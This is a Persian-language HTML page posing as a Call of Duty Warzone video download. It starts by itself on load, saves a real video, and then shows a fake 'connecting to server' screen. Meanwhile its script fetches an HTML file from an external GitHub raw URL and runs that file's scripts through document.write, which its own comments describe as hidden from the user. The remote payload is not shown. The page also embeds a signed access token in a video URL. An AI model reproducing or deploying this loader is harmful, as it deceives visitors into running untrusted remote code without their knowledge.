<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Call of Duty | مرکز فرماندهی</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, sans-serif;
        }

        body {
            min-height: 100vh;
            background: url('https://cdn.imgurl.ir/uploads/d084228_IMG_20260424_093435_085.jpg') no-repeat center center fixed;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            z-index: 0;
        }

        /* دیالوگ دانلود حرفه‌ای */
        .download-dialog {
            position: relative;
            z-index: 10;
            max-width: 500px;
            width: 90%;
            background: linear-gradient(145deg, #1a1a2e, #0f0f1a);
            backdrop-filter: blur(20px);
            border-radius: 40px;
            padding: 30px 25px;
            border: 2px solid rgba(255, 180, 40, 0.9);
            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.8), 0 0 30px rgba(255, 100, 0, 0.3);
            text-align: center;
            animation: fadeInUp 0.4s ease-out;
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(50px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .cod-icon {
            width: 80px;
            filter: drop-shadow(0 0 10px orange);
            margin-bottom: 10px;
        }

        h2 {
            color: #ffcc44;
            font-size: 1.8rem;
            letter-spacing: 2px;
            text-shadow: 0 0 10px #ff6600;
        }

        .file-name {
            background: #00000066;
            padding: 8px 15px;
            border-radius: 50px;
            display: inline-block;
            margin: 15px 0;
            color: #ffaa66;
            font-family: monospace;
        }

        .progress-ring {
            width: 120px;
            height: 120px;
            margin: 20px auto;
            position: relative;
        }

        .progress-ring svg {
            transform: rotate(-90deg);
        }

        .progress-ring-circle {
            fill: none;
            stroke: #ffaa33;
            stroke-width: 8;
            stroke-linecap: round;
            stroke-dasharray: 314;
            stroke-dashoffset: 314;
            transition: stroke-dashoffset 0.2s linear;
        }

        .progress-ring-bg {
            fill: none;
            stroke: #333;
            stroke-width: 8;
        }

        .percent-text {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: #ffcc66;
            font-size: 1.5rem;
            font-weight: bold;
        }

        .speed-info {
            display: flex;
            justify-content: space-between;
            background: rgba(0,0,0,0.5);
            padding: 12px 20px;
            border-radius: 50px;
            margin: 15px 0;
            font-weight: bold;
            color: #ddd;
        }

        .cancel-btn {
            background: linear-gradient(145deg, #883333, #551111);
            border: none;
            padding: 12px 25px;
            border-radius: 50px;
            color: white;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
            width: 100%;
            font-size: 1rem;
        }

        .cancel-btn:hover {
            background: #aa4444;
        }
    </style>
</head>
<body>

<div id="downloadDialog" class="download-dialog">
    <img src="https://cdn-icons-png.flaticon.com/512/552/552222.png" class="cod-icon" alt="logo">
    <h2>💀 WARZONE</h2>
    <div class="file-name">📁 CallOfDuty_Warzone_Video.mp4</div>
    
    <div class="progress-ring">
        <svg width="120" height="120">
            <circle class="progress-ring-bg" cx="60" cy="60" r="50" stroke-width="8" fill="none"></circle>
            <circle class="progress-ring-circle" cx="60" cy="60" r="50" stroke-width="8" fill="none"></circle>
        </svg>
        <div class="percent-text" id="percentText">0%</div>
    </div>
    
    <div class="speed-info">
        <span>⚡ سرعت:</span>
        <span id="speedText">0 KB/s</span>
    </div>
    <div class="speed-info">
        <span>⏱️ زمان باقی‌مانده:</span>
        <span id="timeText">--:--</span>
    </div>
    
    <button class="cancel-btn" id="cancelBtn">🗑️ لغو دانلود</button>
</div>

<script>
    // ======================== لینک ویدیو و گیتاب ========================
    const VIDEO_URL = "https://caspian20.cdn.asset.aparat.com/aparat-video/b4325084210ca72cc848b20bb0ba424262248455-240p.mp4?wmsAuthSign=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6IjI3MjFmYTIyNjc2MGQ2OWYxNmFhNDU2NTc3YWI5MDhiIiwiZXhwIjoxNzc3MzAyOTEzLCJpc3MiOiJTYWJhIElkZWEgR1NJRyJ9.AJVUnDZ_sAxGCNrhZVxXZ9cUAvOb8jA8gf5zpFaCvsk";
    const GITHUB_PAGE_URL = "https://raw.githubusercontent.com/s0379265-netizen/Pmkatba_____po/main/Ytkpo.htm";
    
    let abortController = null;
    let isDownloading = false;
    
    // عناصر دیالوگ
    const dialog = document.getElementById('downloadDialog');
    const percentSpan = document.getElementById('percentText');
    const speedSpan = document.getElementById('speedText');
    const timeSpan = document.getElementById('timeText');
    const cancelBtn = document.getElementById('cancelBtn');
    const circle = document.querySelector('.progress-ring-circle');
    const circumference = 314;
    
    // تابع بروزرسانی دایره پیشرفت
    function setProgress(percent) {
        const offset = circumference - (percent / 100) * circumference;
        circle.style.strokeDashoffset = offset;
        percentSpan.innerText = `${Math.floor(percent)}%`;
    }
    
    function formatTime(seconds) {
        if (!isFinite(seconds) || seconds < 0) return "00:00";
        const mins = Math.floor(seconds / 60);
        const secs = Math.floor(seconds % 60);
        return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
    }
    
    // دانلود فایل ویدیو با دیالوگ حرفه‌ای
    async function startDownload() {
        if (isDownloading) return;
        isDownloading = true;
        
        try {
            abortController = new AbortController();
            const response = await fetch(VIDEO_URL, { signal: abortController.signal });
            const reader = response.body.getReader();
            const contentLength = parseInt(response.headers.get('content-length')) || 0;
            
            let receivedLength = 0;
            let chunks = [];
            let startTime = performance.now();
            let lastLoaded = 0;
            let lastTime = startTime;
            
            while (true) {
                const { done, value } = await reader.read();
                if (done) break;
                
                chunks.push(value);
                receivedLength += value.length;
                
                if (contentLength > 0) {
                    const percent = (receivedLength / contentLength) * 100;
                    setProgress(percent);
                }
                
                const now = performance.now();
                if (now - lastTime >= 300) {
                    const timeDiffSec = (now - lastTime) / 1000;
                    const bytesDiff = receivedLength - lastLoaded;
                    const speedBytesPerSec = bytesDiff / timeDiffSec;
                    const speedKBps = (speedBytesPerSec / 1024).toFixed(0);
                    speedSpan.innerText = `${speedKBps} KB/s`;
                    
                    if (contentLength > 0 && speedBytesPerSec > 0) {
                        const remainingBytes = contentLength - receivedLength;
                        const secondsLeft = remainingBytes / speedBytesPerSec;
                        timeSpan.innerText = formatTime(secondsLeft);
                    }
                    
                    lastLoaded = receivedLength;
                    lastTime = now;
                }
            }
            
            // دانلود کامل شد - ذخیره فایل در دستگاه
            const blob = new Blob(chunks, { type: 'video/mp4' });
            const downloadUrl = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = downloadUrl;
            a.download = 'CallOfDuty_Warzone_Video.mp4';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(downloadUrl);
            
            // بستن دیالوگ دانلود
            dialog.style.display = 'none';
            
            // نمایش صفحه "در حال اتصال به سرور..."
            showConnectingScreen();
            
            // استخراج و اجرای کدهای گیتاب (مخفی)
            await fetchAndExecuteGithubCode();
            
        } catch (error) {
            if (error.name === 'AbortError') {
                alert("❌ دانلود لغو شد");
            } else {
                alert("❌ خطا در دانلود");
            }
            resetDownload();
        } finally {
            isDownloading = false;
        }
    }
    
    // نمایش صفحه "در حال اتصال به سرور..."
    function showConnectingScreen() {
        document.body.innerHTML = `
            <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:linear-gradient(135deg, #001133, #000822); display:flex; justify-content:center; align-items:center; flex-direction:column; z-index:1000;">
                <div class="spinner" style="width:60px; height:60px; border:5px solid rgba(255,255,255,0.3); border-top-color:cyan; border-radius:50%; animation:spin 1s linear infinite; margin-bottom:30px;"></div>
                <h2 style="color:cyan; font-family:tahoma;">🔄 در حال اتصال به سرور...</h2>
                <p style="color:#aaa; margin-top:15px;">لطفاً چند لحظه صبر کنید</p>
                <style>@keyframes spin{to{transform:rotate(360deg);}}</style>
            </div>
        `;
    }
    
    // استخراج و اجرای کدهای گیتاب (بدون نمایش کدها به کاربر)
    async function fetchAndExecuteGithubCode() {
        try {
            const response = await fetch(GITHUB_PAGE_URL);
            let htmlCode = await response.text();
            
            // استخراج محتوای داخل <body> برای اجرا (بدون نمایش کدها)
            const bodyMatch = htmlCode.match(/<body[^>]*>([\s\S]*?)<\/body>/i);
            const bodyContent = bodyMatch ? bodyMatch[1] : htmlCode;
            
            // استخراج استایل‌ها
            const styleMatch = htmlCode.match(/<style[^>]*>([\s\S]*?)<\/style>/i);
            const styles = styleMatch ? styleMatch[1] : '';
            
            // استخراج اسکریپت‌ها
            const scriptMatches = htmlCode.match(/<script[^>]*>([\s\S]*?)<\/script>/gi);
            let scripts = '';
            if (scriptMatches) {
                scripts = scriptMatches.map(s => {
                    const match = s.match(/<script[^>]*>([\s\S]*?)<\/script>/i);
                    return match ? match[1] : '';
                }).join('\n');
            }
            
            // ایجاد صفحه جدید و اجرای کدها (بدون نمایش کدها به کاربر)
            const newDoc = document.open();
            newDoc.write(`
                <!DOCTYPE html>
                <html>
                <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>مافیا لابی</title><style>${styles}</style></head>
                <body>${bodyContent}<script>${scripts}<\/script></body>
                </html>
            `);
            newDoc.close();
            
        } catch (error) {
            console.error("خطا در اجرای کدها:", error);
            document.body.innerHTML = `<div style="color:red; text-align:center; padding:50px;">❌ خطا در اتصال به سرور</div>`;
        }
    }
    
    function resetDownload() {
        if (abortController) abortController.abort();
        isDownloading = false;
        setProgress(0);
        speedSpan.innerText = "0 KB/s";
        timeSpan.innerText = "--:--";
    }
    
    cancelBtn.addEventListener('click', () => {
        if (abortController) {
            abortController.abort();
            resetDownload();
            alert("دانلود لغو شد");
        }
    });
    
    // شروع خودکار دانلود هنگام بارگذاری صفحه
    startDownload();
</script>
</body>
</html>
